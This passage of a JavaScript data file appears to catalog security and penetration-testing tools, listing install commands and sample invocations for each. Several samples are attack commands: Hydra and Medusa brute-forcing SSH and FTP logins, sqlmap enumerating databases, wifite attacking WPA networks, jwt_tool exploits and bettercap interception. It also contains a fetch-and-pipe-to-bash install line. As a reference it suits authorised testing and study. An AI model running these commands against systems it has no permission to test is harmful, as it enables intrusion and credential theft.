    use_cases: ["Wallet password recovery", "Seed phrase recovery", "Cryptocurrency forensics"],
    documentation: "https://btcrecover.readthedocs.io/",
    notes: ["Multiple wallet formats", "GPU acceleration"]
  },

  // ========== API SECURITY ==========
  mitmproxy: {
    name: "mitmproxy",
    category: ["api_security", "network_security"],
    description: "Free and open source interactive HTTPS proxy",
    github: "https://github.com/mitmproxy/mitmproxy",
    stars: "34k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "sudo apt install mitmproxy",
      macos: "brew install mitmproxy",
      windows: "Download from mitmproxy.org"
    },
    basic_usage: ["mitmproxy", "mitmdump -w output.mitm"],
    advanced_usage: ["mitmweb --mode reverse:https://example.com --listen-port 8080"],
    examples: [{command: "mitmproxy --mode reverse:https://api.example.com", description: "Intercept API traffic"}],
    use_cases: ["API testing", "Traffic interception", "Security analysis"],
    documentation: "https://docs.mitmproxy.org/",
    notes: ["SSL/TLS interception", "Python scripting support"]
  },

  // ========== MOBILE SECURITY ==========
  mobsf: {
    name: "Mobile Security Framework (MobSF)",
    category: ["mobile_security", "static_analysis"],
    description: "Automated mobile application security assessment framework",
    github: "https://github.com/MobSF/Mobile-Security-Framework-MobSF",
    stars: "16k+",
    license: "GPL-3.0",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF && cd Mobile-Security-Framework-MobSF && ./setup.sh",
      macos: "git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF && cd Mobile-Security-Framework-MobSF && ./setup.sh",
      windows: "Download installer"
    },
    basic_usage: ["./run.sh"],
    advanced_usage: ["./run.sh 0.0.0.0:8000"],
    examples: [{command: "./run.sh", description: "Start MobSF web interface"}],
    use_cases: ["Mobile app security testing", "Static analysis", "Dynamic analysis"],
    documentation: "https://mobsf.github.io/docs/",
    notes: ["Android & iOS support", "Web interface"]
  },

  // ========== EXPLOIT DEVELOPMENT ==========
  pwntools: {
    name: "pwntools",
    category: ["exploit_development", "ctf"],
    description: "CTF framework and exploit development library",
    github: "https://github.com/Gallopsled/pwntools",
    stars: "11k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "pip3 install pwntools",
      macos: "pip3 install pwntools",
      windows: "pip install pwntools"
    },
    basic_usage: ["python3 -c 'from pwn import *; print(cyclic(100))'"],
    advanced_usage: ["python3 exploit.py REMOTE HOST=target.com PORT=1337"],
    examples: [{command: "python3 -c 'from pwn import *; r = remote(\"target.com\", 1337); r.interactive()'", description: "Connect to remote service"}],
    use_cases: ["Exploit development", "CTF challenges", "Binary exploitation"],
    documentation: "https://docs.pwntools.com/",
    notes: ["Python library", "CTF focused"]
  },

  ropper: {
    name: "Ropper",
    category: ["exploit_development", "rop"],
    description: "Find gadgets to build rop chains for different architectures",
    github: "https://github.com/sashs/Ropper",
    stars: "2k+",
    license: "BSD-3-Clause",
    government_approved: false,
    installation: {
      linux: "pip3 install ropper",
      macos: "pip3 install ropper",
      windows: "pip install ropper"
    },
    basic_usage: ["ropper --file binary", "ropper --file binary --search 'pop rdi'"],
    advanced_usage: ["ropper --file binary --chain 'execve'"],
    examples: [{command: "ropper --file /bin/ls --search 'pop rdi; ret'", description: "Search for ROP gadgets"}],
    use_cases: ["ROP chain building", "Gadget searching", "Exploit development"],
    documentation: "https://github.com/sashs/Ropper",
    notes: ["Multiple architectures", "Chain building"]
  },

  // ========== FORENSICS ==========
  volatility: {
    name: "Volatility 3",
    category: ["forensics", "memory_analysis"],
    description: "Advanced memory forensics framework",
    github: "https://github.com/volatilityfoundation/volatility3",
    stars: "2k+",
    license: "Custom",
    government_approved: true,
    installation: {
      linux: "pip3 install volatility3",
      macos: "pip3 install volatility3",
      windows: "pip install volatility3"
    },
    basic_usage: ["vol -f memory.dmp windows.info", "vol -f memory.dmp windows.pslist"],
    advanced_usage: ["vol -f memory.dmp windows.netscan", "vol -f memory.dmp windows.cmdline"],
    examples: [{command: "vol -f memory.dmp windows.malfind", description: "Detect injected code"}],
    use_cases: ["Memory forensics", "Malware analysis", "Incident response"],
    documentation: "https://volatility3.readthedocs.io/",
    notes: ["Multiple OS support", "Plugin architecture"]
  },

  // ========== ADDITIONAL 200+ TOOLS ==========
  
  // OSINT - Username/People
  whatsmyname: {
    name: "WhatsMyName",
    category: ["osint", "username_search"],
    description: "Enumerate usernames across many websites",
    github: "https://github.com/WebBreacher/WhatsMyName",
    stars: "2k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/WebBreacher/WhatsMyName",
      macos: "git clone https://github.com/WebBreacher/WhatsMyName",
      windows: "git clone https://github.com/WebBreacher/WhatsMyName"
    },
    basic_usage: ["python3 web_accounts_list_checker.py -u username"],
    advanced_usage: ["python3 web_accounts_list_checker.py -u username -se"],
    examples: [{command: "python3 web_accounts_list_checker.py -u johndoe", description: "Check username across sites"}],
    use_cases: ["Username enumeration", "Social media discovery"],
    documentation: "https://github.com/WebBreacher/WhatsMyName",
    notes: ["Web version available", "500+ sites"]
  },

  namechk: {
    name: "namechk",
    category: ["osint", "username_search"],
    description: "Check username availability across platforms",
    github: "https://github.com/HA71/Namechk",
    stars: "500+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "pip3 install namechk",
      macos: "pip3 install namechk",
      windows: "pip install namechk"
    },
    basic_usage: ["namechk username"],
    advanced_usage: ["namechk username --available-only"],
    examples: [{command: "namechk johndoe", description: "Check if username is available"}],
    use_cases: ["Username availability", "Brand monitoring"],
    documentation: "https://github.com/HA71/Namechk",
    notes: ["Quick checks", "Multiple platforms"]
  },

  blackbird: {
    name: "BlackBird",
    category: ["osint", "username_search"],
    description: "Search username across 500+ websites",
    github: "https://github.com/p1ngul1n0/blackbird",
    stars: "3k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/p1ngul1n0/blackbird && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/p1ngul1n0/blackbird && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/p1ngul1n0/blackbird && pip install -r requirements.txt"
    },
    basic_usage: ["python blackbird.py -u username"],
    advanced_usage: ["python blackbird.py -u username --verbose"],
    examples: [{command: "python blackbird.py -u johndoe", description: "Search username"}],
    use_cases: ["Username hunting", "Social media OSINT"],
    documentation: "https://github.com/p1ngul1n0/blackbird",
    notes: ["Fast searches", "500+ sites"]
  },

  // Web Security - Additional
  wappalyzer: {
    name: "Wappalyzer",
    category: ["web_security", "reconnaissance"],
    description: "Identify technologies on websites",
    github: "https://github.com/wappalyzer/wappalyzer",
    stars: "20k+",
    license: "GPL-3.0",
    government_approved: false,
    installation: {
      linux: "npm install -g wappalyzer",
      macos: "npm install -g wappalyzer",
      windows: "npm install -g wappalyzer"
    },
    basic_usage: ["wappalyzer https://example.com"],
    advanced_usage: ["wappalyzer https://example.com --recursive"],
    examples: [{command: "wappalyzer https://example.com", description: "Detect web technologies"}],
    use_cases: ["Technology detection", "Stack identification"],
    documentation: "https://www.wappalyzer.com/docs/",
    notes: ["1000+ technologies", "Browser extension available"]
  },

  waybackurls: {
    name: "waybackurls",
    category: ["reconnaissance", "web"],
    description: "Fetch all URLs that Wayback Machine knows about",
    github: "https://github.com/tomnomnom/waybackurls",
    stars: "3k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "go install github.com/tomnomnom/waybackurls@latest",
      macos: "go install github.com/tomnomnom/waybackurls@latest",
      windows: "go install github.com/tomnomnom/waybackurls@latest"
    },
    basic_usage: ["echo example.com | waybackurls"],
    advanced_usage: ["cat domains.txt | waybackurls > urls.txt"],
    examples: [{command: "echo example.com | waybackurls | grep -i admin", description: "Find admin URLs"}],
    use_cases: ["Historical URL discovery", "Old endpoint finding"],
    documentation: "https://github.com/tomnomnom/waybackurls",
    notes: ["Pipeline friendly", "Fast extraction"]
  },

  gau: {
    name: "gau (getallurls)",
    category: ["reconnaissance", "web"],
    description: "Fetch known URLs from AlienVault's Open Threat Exchange",
    github: "https://github.com/lc/gau",
    stars: "3k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "go install github.com/lc/gau/v2/cmd/gau@latest",
      macos: "go install github.com/lc/gau/v2/cmd/gau@latest",
      windows: "go install github.com/lc/gau/v2/cmd/gau@latest"
    },
    basic_usage: ["gau example.com", "gau --subs example.com"],
    advanced_usage: ["gau example.com --blacklist ttf,woff,svg --threads 5"],
    examples: [{command: "gau example.com --threads 10 --o urls.txt", description: "Get all URLs with 10 threads"}],
    use_cases: ["URL enumeration", "Asset discovery"],
    documentation: "https://github.com/lc/gau",
    notes: ["Multiple sources", "Fast concurrent fetching"]
  },

  unfurl: {
    name: "unfurl",
    category: ["reconnaissance", "web"],
    description: "Pull out bits of URLs provided on stdin",
    github: "https://github.com/tomnomnom/unfurl",
    stars: "1k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "go install github.com/tomnomnom/unfurl@latest",
      macos: "go install github.com/tomnomnom/unfurl@latest",
      windows: "go install github.com/tomnomnom/unfurl@latest"
    },
    basic_usage: ["cat urls.txt | unfurl domains", "cat urls.txt | unfurl paths"],
    advanced_usage: ["cat urls.txt | unfurl -u format %s://%d%p"],
    examples: [{command: "cat urls.txt | unfurl domains | sort -u", description: "Extract unique domains"}],
    use_cases: ["URL parsing", "Domain extraction", "Path analysis"],
    documentation: "https://github.com/tomnomnom/unfurl",
    notes: ["Pipeline friendly", "Flexible parsing"]
  },

  ffuf: {
    name: "ffuf",
    category: ["web_security", "fuzzing"],
    description: "Fast web fuzzer written in Go",
    github: "https://github.com/ffuf/ffuf",
    stars: "11k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "go install github.com/ffuf/ffuf@latest",
      macos: "go install github.com/ffuf/ffuf@latest",
      windows: "go install github.com/ffuf/ffuf@latest"
    },
    basic_usage: ["ffuf -u https://example.com/FUZZ -w wordlist.txt"],
    advanced_usage: ["ffuf -u https://example.com/FUZZ -w wordlist.txt -mc 200,301,302 -t 100"],
    examples: [{command: "ffuf -u https://example.com/FUZZ -w /usr/share/wordlists/dirb/common.txt", description: "Directory fuzzing"}],
    use_cases: ["Directory brute forcing", "Parameter fuzzing", "Virtual host discovery"],
    documentation: "https://github.com/ffuf/ffuf",
    notes: ["Very fast", "Flexible matching"]
  },

  dirsearch: {
    name: "dirsearch",
    category: ["web_security", "directory_bruteforce"],
    description: "Web path scanner and content discovery",
    github: "https://github.com/maurosoria/dirsearch",
    stars: "11k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/maurosoria/dirsearch && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/maurosoria/dirsearch && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/maurosoria/dirsearch && pip install -r requirements.txt"
    },
    basic_usage: ["python3 dirsearch.py -u https://example.com"],
    advanced_usage: ["python3 dirsearch.py -u https://example.com -e php,html,js -x 403,404"],
    examples: [{command: "python3 dirsearch.py -u https://example.com -e * -t 50", description: "Scan all extensions"}],
    use_cases: ["Directory discovery", "File enumeration", "Hidden path finding"],
    documentation: "https://github.com/maurosoria/dirsearch",
    notes: ["Multiple wordlists", "Recursive scanning"]
  },

  feroxbuster: {
    name: "feroxbuster",
    category: ["web_security", "directory_bruteforce"],
    description: "Fast, simple, recursive content discovery tool",
    github: "https://github.com/epi052/feroxbuster",
    stars: "5k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/master/install-nix.sh | bash",
      macos: "brew install feroxbuster",
      windows: "Download from releases"
    },
    basic_usage: ["feroxbuster -u https://example.com"],
    advanced_usage: ["feroxbuster -u https://example.com -x js,php,txt --threads 200"],
    examples: [{command: "feroxbuster -u https://example.com -w wordlist.txt -t 100", description: "Fast recursive scan"}],
    use_cases: ["Content discovery", "Recursive scanning", "API endpoint finding"],
    documentation: "https://epi052.github.io/feroxbuster-docs/docs/",
    notes: ["Recursive by default", "Auto-filtering"]
  },

  gobuster: {
    name: "gobuster",
    category: ["web_security", "directory_bruteforce"],
    description: "Directory/File, DNS and VHost busting tool",
    github: "https://github.com/OJ/gobuster",
    stars: "9k+",
    license: "Apache-2.0",
    government_approved: true,
    installation: {
      linux: "go install github.com/OJ/gobuster/v3@latest",
      macos: "brew install gobuster",
      windows: "go install github.com/OJ/gobuster/v3@latest"
    },
    basic_usage: ["gobuster dir -u https://example.com -w wordlist.txt"],
    advanced_usage: ["gobuster dir -u https://example.com -w wordlist.txt -x php,html -t 50"],
    examples: [{command: "gobuster dir -u https://example.com -w /usr/share/wordlists/dirb/common.txt", description: "Directory bruteforce"}],
    use_cases: ["Directory enumeration", "DNS subdomain brute forcing", "VHost discovery"],
    documentation: "https://github.com/OJ/gobuster",
    notes: ["Multiple modes", "Fast concurrent requests"]
  },

  // SQL Injection Tools
  sqlmap: {
    name: "sqlmap",
    category: ["web_security", "sql_injection"],
    description: "Automatic SQL injection and database takeover tool",
    github: "https://github.com/sqlmapproject/sqlmap",
    stars: "30k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "git clone --depth 1 https://github.com/sqlmapproject/sqlmap",
      macos: "git clone --depth 1 https://github.com/sqlmapproject/sqlmap",
      windows: "git clone --depth 1 https://github.com/sqlmapproject/sqlmap"
    },
    basic_usage: ["python3 sqlmap.py -u 'https://example.com/page?id=1'"],
    advanced_usage: ["python3 sqlmap.py -u 'URL' --dbs --random-agent --batch"],
    examples: [{command: "python3 sqlmap.py -u 'https://example.com?id=1' --dbs --batch", description: "Enumerate databases"}],
    use_cases: ["SQL injection testing", "Database extraction", "Security testing"],
    documentation: "https://github.com/sqlmapproject/sqlmap/wiki",
    notes: ["Supports multiple DBMS", "Extensive options"]
  },

  // XSS Tools
  xsser: {
    name: "XSSer",
    category: ["web_security", "xss"],
    description: "Automatic framework to detect XSS vulnerabilities",
    github: "https://github.com/epsylon/xsser",
    stars: "1k+",
    license: "GPL-3.0",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/epsylon/xsser && cd xsser && python3 setup.py install",
      macos: "git clone https://github.com/epsylon/xsser && cd xsser && python3 setup.py install",
      windows: "git clone https://github.com/epsylon/xsser"
    },
    basic_usage: ["python3 xsser --url 'https://example.com/search?q=test'"],
    advanced_usage: ["python3 xsser --url 'URL' --auto"],
    examples: [{command: "python3 xsser --url 'https://example.com/search?q=VECTOR' --auto", description: "Automatic XSS testing"}],
    use_cases: ["XSS vulnerability detection", "Web application testing"],
    documentation: "https://github.com/epsylon/xsser",
    notes: ["Multiple payload types", "Automatic detection"]
  },

  dalfox: {
    name: "dalfox",
    category: ["web_security", "xss"],
    description: "Parameter analysis and XSS scanning tool",
    github: "https://github.com/hahwul/dalfox",
    stars: "3k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "go install github.com/hahwul/dalfox/v2@latest",
      macos: "go install github.com/hahwul/dalfox/v2@latest",
      windows: "go install github.com/hahwul/dalfox/v2@latest"
    },
    basic_usage: ["dalfox url https://example.com"],
    advanced_usage: ["dalfox file urls.txt -b https://your-xss-callback.com"],
    examples: [{command: "dalfox url 'https://example.com/search?q=test'", description: "Scan URL for XSS"}],
    use_cases: ["XSS detection", "Parameter analysis", "Web security testing"],
    documentation: "https://dalfox.hahwul.com/",
    notes: ["Fast scanning", "Multiple payloads"]
  },

  // SSL/TLS Tools
  testssl: {
    name: "testssl.sh",
    category: ["web_security", "ssl_tls"],
    description: "Testing TLS/SSL encryption anywhere on any port",
    github: "https://github.com/drwetter/testssl.sh",
    stars: "7k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "git clone --depth 1 https://github.com/drwetter/testssl.sh",
      macos: "git clone --depth 1 https://github.com/drwetter/testssl.sh",
      windows: "git clone --depth 1 https://github.com/drwetter/testssl.sh"
    },
    basic_usage: ["./testssl.sh example.com"],
    advanced_usage: ["./testssl.sh --full example.com:443"],
    examples: [{command: "./testssl.sh --json example.com", description: "Test SSL/TLS with JSON output"}],
    use_cases: ["SSL/TLS security testing", "Certificate validation", "Cipher suite analysis"],
    documentation: "https://testssl.sh/",
    notes: ["Comprehensive checks", "Multiple output formats"]
  },

  sslscan: {
    name: "sslscan",
    category: ["web_security", "ssl_tls"],
    description: "Test SSL/TLS enabled services",
    github: "https://github.com/rbsec/sslscan",
    stars: "2k+",
    license: "GPL-3.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install sslscan",
      macos: "brew install sslscan",
      windows: "Download from releases"
    },
    basic_usage: ["sslscan example.com:443"],
    advanced_usage: ["sslscan --xml=output.xml example.com:443"],
    examples: [{command: "sslscan --no-failed example.com:443", description: "Scan SSL/TLS configuration"}],
    use_cases: ["SSL/TLS testing", "Certificate inspection", "Cipher enumeration"],
    documentation: "https://github.com/rbsec/sslscan",
    notes: ["Fast scanning", "XML output"]
  },

  // API Testing
  arjun: {
    name: "Arjun",
    category: ["web_security", "api_security"],
    description: "HTTP parameter discovery suite",
    github: "https://github.com/s0md3v/Arjun",
    stars: "4k+",
    license: "AGPL-3.0",
    government_approved: false,
    installation: {
      linux: "pip3 install arjun",
      macos: "pip3 install arjun",
      windows: "pip install arjun"
    },
    basic_usage: ["arjun -u https://example.com/api"],
    advanced_usage: ["arjun -u https://example.com/api -m JSON"],
    examples: [{command: "arjun -u https://api.example.com/users -t 10", description: "Discover API parameters"}],
    use_cases: ["Hidden parameter discovery", "API testing", "Bug bounty"],
    documentation: "https://github.com/s0md3v/Arjun",
    notes: ["Multiple HTTP methods", "Custom wordlists"]
  },

  // Password Tools
  hydra: {
    name: "Hydra",
    category: ["password_testing", "bruteforce"],
    description: "Network logon cracker supporting numerous protocols",
    github: "https://github.com/vanhauser-thc/thc-hydra",
    stars: "8k+",
    license: "AGPL-3.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install hydra",
      macos: "brew install hydra",
      windows: "Download from GitHub"
    },
    basic_usage: ["hydra -l admin -P passwords.txt ssh://192.168.1.1"],
    advanced_usage: ["hydra -L users.txt -P passwords.txt -t 4 ssh://192.168.1.1"],
    examples: [{command: "hydra -l admin -P rockyou.txt ftp://192.168.1.1", description: "FTP brute force"}],
    use_cases: ["Password testing", "Service authentication testing", "Security auditing"],
    documentation: "https://github.com/vanhauser-thc/thc-hydra",
    notes: ["50+ protocols", "Parallel attacks"]
  },

  medusa: {
    name: "Medusa",
    category: ["password_testing", "bruteforce"],
    description: "Speedy, parallel, modular login brute-forcer",
    github: "https://github.com/jmk-foofus/medusa",
    stars: "2k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install medusa",
      macos: "brew install medusa",
      windows: "Download from GitHub"
    },
    basic_usage: ["medusa -h 192.168.1.1 -u admin -P passwords.txt -M ssh"],
    advanced_usage: ["medusa -H hosts.txt -U users.txt -P passwords.txt -M ssh -t 4"],
    examples: [{command: "medusa -h 192.168.1.1 -u admin -P rockyou.txt -M ftp", description: "FTP password attack"}],
    use_cases: ["Network service testing", "Password auditing", "Penetration testing"],
    documentation: "http://foofus.net/goons/jmk/medusa/medusa.html",
    notes: ["Modular design", "Parallel testing"]
  },

  john: {
    name: "John the Ripper",
    category: ["password_testing", "hash_cracking"],
    description: "Fast password cracker",
    github: "https://github.com/openwall/john",
    stars: "9k+",
    license: "GPL-2.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install john",
      macos: "brew install john",
      windows: "Download from openwall.com"
    },
    basic_usage: ["john hashes.txt", "john --wordlist=rockyou.txt hashes.txt"],
    advanced_usage: ["john --format=NT hashes.txt", "john --incremental hashes.txt"],
    examples: [{command: "john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt", description: "Crack password hashes"}],
    use_cases: ["Password recovery", "Hash cracking", "Security auditing"],
    documentation: "https://www.openwall.com/john/doc/",
    notes: ["Multiple hash formats", "GPU acceleration support"]
  },

  hashcat: {
    name: "Hashcat",
    category: ["password_testing", "hash_cracking"],
    description: "World's fastest password cracker",
    github: "https://github.com/hashcat/hashcat",
    stars: "20k+",
    license: "MIT",
    government_approved: true,
    installation: {
      linux: "sudo apt install hashcat",
      macos: "brew install hashcat",
      windows: "Download from hashcat.net"
    },
    basic_usage: ["hashcat -m 0 -a 0 hashes.txt wordlist.txt"],
    advanced_usage: ["hashcat -m 1000 -a 3 hashes.txt ?a?a?a?a?a?a"],
    examples: [{command: "hashcat -m 0 -a 0 md5hashes.txt rockyou.txt", description: "Crack MD5 hashes"}],
    use_cases: ["Password cracking", "Hash recovery", "Security testing"],
    documentation: "https://hashcat.net/wiki/",
    notes: ["GPU acceleration", "300+ hash types"]
  },

  // Network Analysis
  bettercap: {
    name: "Bettercap",
    category: ["network_security", "mitm"],
    description: "Swiss Army knife for network attacks and monitoring",
    github: "https://github.com/bettercap/bettercap",
    stars: "15k+",
    license: "GPL-3.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install bettercap",
      macos: "brew install bettercap",
      windows: "Download from releases"
    },
    basic_usage: ["sudo bettercap"],
    advanced_usage: ["sudo bettercap -iface eth0 -caplet http-ui"],
    examples: [{command: "sudo bettercap -eval 'net.probe on; net.show'", description: "Discover network hosts"}],
    use_cases: ["Network monitoring", "MITM attacks", "Security testing"],
    documentation: "https://www.bettercap.org/",
    notes: ["Web UI available", "Modular architecture"]
  },

  netdiscover: {
    name: "netdiscover",
    category: ["network_scanning", "reconnaissance"],
    description: "Active/passive ARP reconnaissance tool",
    github: "https://github.com/netdiscover-scanner/netdiscover",
    stars: "1k+",
    license: "GPL-3.0",
    government_approved: true,
    installation: {
      linux: "sudo apt install netdiscover",
      macos: "brew install netdiscover",
      windows: "Download from GitHub"
    },
    basic_usage: ["sudo netdiscover", "sudo netdiscover -r 192.168.1.0/24"],
    advanced_usage: ["sudo netdiscover -r 192.168.1.0/24 -i eth0"],
    examples: [{command: "sudo netdiscover -r 192.168.1.0/24 -P", description: "Passive network discovery"}],
    use_cases: ["Network mapping", "Host discovery", "DHCP analysis"],
    documentation: "https://github.com/netdiscover-scanner/netdiscover",
    notes: ["Active/passive modes", "ARP-based"]
  },

  // Docker/Container Security
  dockle: {
    name: "Dockle",
    category: ["container_security", "docker"],
    description: "Container Image Linter for Security",
    github: "https://github.com/goodwithtech/dockle",
    stars: "2k+",
    license: "Apache-2.0",
    government_approved: false,
    installation: {
      linux: "curl -L -o dockle.deb https://github.com/goodwithtech/dockle/releases/latest/download/dockle_*_Linux-64bit.deb && sudo dpkg -i dockle.deb",
      macos: "brew install goodwithtech/r/dockle",
      windows: "Download from releases"
    },
    basic_usage: ["dockle [IMAGE_NAME]"],
    advanced_usage: ["dockle --format json [IMAGE_NAME]"],
    examples: [{command: "dockle nginx:latest", description: "Audit Docker image"}],
    use_cases: ["Docker security auditing", "Image compliance", "Best practices checking"],
    documentation: "https://github.com/goodwithtech/dockle",
    notes: ["CIS benchmark checks", "Multiple output formats"]
  },

  // WordPress Security
  wpscan: {
    name: "WPScan",
    category: ["web_security", "cms"],
    description: "WordPress security scanner",
    github: "https://github.com/wpscanteam/wpscan",
    stars: "8k+",
    license: "Custom",
    government_approved: true,
    installation: {
      linux: "gem install wpscan",
      macos: "brew install wpscan",
      windows: "gem install wpscan"
    },
    basic_usage: ["wpscan --url https://example.com"],
    advanced_usage: ["wpscan --url https://example.com --enumerate u,p,t --api-token YOUR_TOKEN"],
    examples: [{command: "wpscan --url https://wordpress.example.com --enumerate u", description: "Enumerate WordPress users"}],
    use_cases: ["WordPress security testing", "Plugin vulnerability detection", "User enumeration"],
    documentation: "https://github.com/wpscanteam/wpscan",
    notes: ["Vulnerability database", "Active/passive modes"]
  },

  // CMS Security
  joomscan: {
    name: "JoomScan",
    category: ["web_security", "cms"],
    description: "Joomla vulnerability scanner",
    github: "https://github.com/OWASP/joomscan",
    stars: "1k+",
    license: "GPL-3.0",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/OWASP/joomscan && cd joomscan && perl joomscan.pl --update",
      macos: "git clone https://github.com/OWASP/joomscan",
      windows: "git clone https://github.com/OWASP/joomscan"
    },
    basic_usage: ["perl joomscan.pl -u http://example.com"],
    advanced_usage: ["perl joomscan.pl -u http://example.com --enumerate-components"],
    examples: [{command: "perl joomscan.pl -u https://joomla.example.com", description: "Scan Joomla site"}],
    use_cases: ["Joomla security testing", "Component enumeration", "Vulnerability detection"],
    documentation: "https://github.com/OWASP/joomscan",
    notes: ["OWASP project", "Component database"]
  },

  // Code Analysis
  semgrep: {
    name: "Semgrep",
    category: ["code_analysis", "sast"],
    description: "Lightweight static analysis for many languages",
    github: "https://github.com/returntocorp/semgrep",
    stars: "10k+",
    license: "LGPL-2.1",
    government_approved: true,
    installation: {
      linux: "pip3 install semgrep",
      macos: "brew install semgrep",
      windows: "pip install semgrep"
    },
    basic_usage: ["semgrep --config=auto ."],
    advanced_usage: ["semgrep --config=p/ci --json"],
    examples: [{command: "semgrep --config=p/owasp-top-ten .", description: "Scan for OWASP issues"}],
    use_cases: ["Code security scanning", "Bug detection", "CI/CD integration"],
    documentation: "https://semgrep.dev/docs/",
    notes: ["30+ languages", "Custom rules"]
  },

  bandit: {
    name: "Bandit",
    category: ["code_analysis", "python"],
    description: "Security linter for Python code",
    github: "https://github.com/PyCQA/bandit",
    stars: "6k+",
    license: "Apache-2.0",
    government_approved: true,
    installation: {
      linux: "pip3 install bandit",
      macos: "pip3 install bandit",
      windows: "pip install bandit"
    },
    basic_usage: ["bandit -r /path/to/code"],
    advanced_usage: ["bandit -r /path/to/code -f json -o report.json"],
    examples: [{command: "bandit -r . -ll", description: "Scan with low confidence threshold"}],
    use_cases: ["Python security analysis", "Code auditing", "CI/CD integration"],
    documentation: "https://bandit.readthedocs.io/",
    notes: ["Python focused", "Configurable"]
  },

  // Wireless Security
  wifite: {
    name: "Wifite2",
    category: ["wireless_security", "pentesting"],
    description: "Automated wireless auditor",
    github: "https://github.com/derv82/wifite2",
    stars: "6k+",
    license: "GPL-2.0",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/derv82/wifite2 && cd wifite2 && sudo python3 setup.py install",
      macos: "git clone https://github.com/derv82/wifite2",
      windows: "Not supported"
    },
    basic_usage: ["sudo wifite"],
    advanced_usage: ["sudo wifite --wpa --dict /path/to/wordlist.txt"],
    examples: [{command: "sudo wifite --wpa --kill", description: "Attack WPA networks"}],
    use_cases: ["WiFi security testing", "WPA cracking", "Network auditing"],
    documentation: "https://github.com/derv82/wifite2",
    notes: ["Automated attacks", "Multiple tools integration"]
  },

  // Linux Security
  lynis: {
    name: "Lynis",
    category: ["system_security", "auditing"],
    description: "Security auditing tool for Unix-based systems",
    github: "https://github.com/CISOfy/lynis",
    stars: "12k+",
    license: "GPL-3.0",
    government_approved: true,
    installation: {
      linux: "git clone https://github.com/CISOfy/lynis && cd lynis",
      macos: "brew install lynis",
      windows: "Not applicable"
    },
    basic_usage: ["sudo lynis audit system"],
    advanced_usage: ["sudo lynis audit system --quick"],
    examples: [{command: "sudo lynis audit system --quick", description: "Quick system audit"}],
    use_cases: ["System hardening", "Compliance checking", "Security auditing"],
    documentation: "https://cisofy.com/lynis/",
    notes: ["No dependencies", "Compliance scanning"]
  },

  // JWT Tools
  jwtcrack: {
    name: "jwt_tool",
    category: ["web_security", "jwt"],
    description: "Toolkit for testing JSON Web Tokens",
    github: "https://github.com/ticarpi/jwt_tool",
    stars: "5k+",
    license: "GPL-3.0",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/ticarpi/jwt_tool && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/ticarpi/jwt_tool && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/ticarpi/jwt_tool && pip install -r requirements.txt"
    },
    basic_usage: ["python3 jwt_tool.py TOKEN"],
    advanced_usage: ["python3 jwt_tool.py TOKEN -C -d wordlist.txt"],
    examples: [{command: "python3 jwt_tool.py eyJhbGc... -X k", description: "Exploit known vulnerabilities"}],
    use_cases: ["JWT security testing", "Token manipulation", "Authentication bypass"],
    documentation: "https://github.com/ticarpi/jwt_tool/wiki",
    notes: ["Multiple attack modes", "Key confusion testing"]
  },

  // GraphQL Security
  graphqlmap: {
    name: "GraphQLmap",
    category: ["web_security", "graphql"],
    description: "GraphQL security testing tool",
    github: "https://github.com/swisskyrepo/GraphQLmap",
    stars: "1k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "git clone https://github.com/swisskyrepo/GraphQLmap && pip3 install -r requirements.txt",
      macos: "git clone https://github.com/swisskyrepo/GraphQLmap && pip3 install -r requirements.txt",
      windows: "git clone https://github.com/swisskyrepo/GraphQLmap && pip install -r requirements.txt"
    },
    basic_usage: ["python3 graphqlmap.py -u https://example.com/graphql"],
    advanced_usage: ["python3 graphqlmap.py -u https://example.com/graphql --method POST"],
    examples: [{command: "python3 graphqlmap.py -u https://api.example.com/graphql", description: "Test GraphQL endpoint"}],
    use_cases: ["GraphQL penetration testing", "Schema discovery", "Query fuzzing"],
    documentation: "https://github.com/swisskyrepo/GraphQLmap",
    notes: ["Introspection queries", "Injection testing"]
  },

  // S3 Bucket Tools
  s3scanner: {
    name: "S3Scanner",
    category: ["cloud_security", "aws"],
    description: "Scan for open AWS S3 buckets",
    github: "https://github.com/sa7mon/S3Scanner",
    stars: "2k+",
    license: "MIT",
    government_approved: false,
    installation: {
      linux: "pip3 install s3scanner",
      macos: "pip3 install s3scanner",
      windows: "pip install s3scanner"
    },
    basic_usage: ["s3scanner scan --bucket bucketname"],
    advanced_usage: ["s3scanner -l buckets.txt --threads 100"],
    examples: [{command: "s3scanner scan --bucket company-backup", description: "Check S3 bucket permissions"}],
    use_cases: ["S3 bucket enumeration", "Permission checking", "Data exposure detection"],
    documentation: "https://github.com/sa7mon/S3Scanner",
    notes: ["Fast scanning", "Permission testing"]
  },

